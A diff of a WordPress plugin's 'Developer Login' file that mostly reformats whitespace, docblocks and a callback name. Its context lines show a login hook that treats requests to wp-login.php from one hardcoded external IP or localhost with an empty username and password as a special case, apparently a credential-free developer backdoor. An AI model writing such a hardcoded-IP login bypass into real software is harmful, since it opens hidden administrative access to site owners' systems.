@@ -6,7 +6,6 @@
      * @subpackage Developer Login
      * @since 2.2.
      */
-
     /**
      * RESET WFC DEVELOPER COOKIE
      *
@@ -40,7 +39,7 @@
      * @since 2.2
      */
     function wfc_developer_login(){
-        if( strpos($_SERVER['REQUEST_URI'],'/wp-login.php')>0){
+        if( strpos( $_SERVER['REQUEST_URI'], '/wp-login.php' ) > 0 ){
             wfc_developer_logout(); //reset cookies
             if( $_SERVER['REMOTE_ADDR'] == '24.171.162.50' || $_SERVER['REMOTE_ADDR'] == '127.0.0.1' ){
                 if( ($_POST['log'] === '' && $_POST['pwd'] === '') ){
@@ -60,7 +59,6 @@
     }
 
     add_action( 'init', 'wfc_developer_login' );
-
     /**
      * HOOK INTO WFC COOKIE WHEN ITS SET
      *
@@ -79,7 +77,9 @@
      * Filter the "Thank you" text displayed in the admin footer. If the current version is out of date display it for developer to reference.
      *
      * @since 4.0
+     *
      * @param string $text The content that will be printed.
+     *
      * @return string
      */
     function Wfc_Developer_Footer( $text ){
@@ -93,7 +93,9 @@
      * Filter class for body tag in admin area. Used for WFC background watermark
      *
      * @since 4.0
+     *
      * @param string $classes Classes added to body tag.
+     *
      * @return string
      */
     function Wfc_Developer_Body_Class( $classes ){
@@ -136,7 +138,7 @@
      * @since 3.0
      */
     function Wfc_Developer_Dashboard_Widget(){
-        wp_add_dashboard_widget( "Wfc_Developer_Dashboard", __( "WFC Dashboard Widget" ), "Wfc_Developer_Dashboard" );
+        wp_add_dashboard_widget( "Wfc_Developer_Dashboard", __( "WFC Dashboard Widget" ), "wfc_developer_dashboard" );
     }
 
     /**
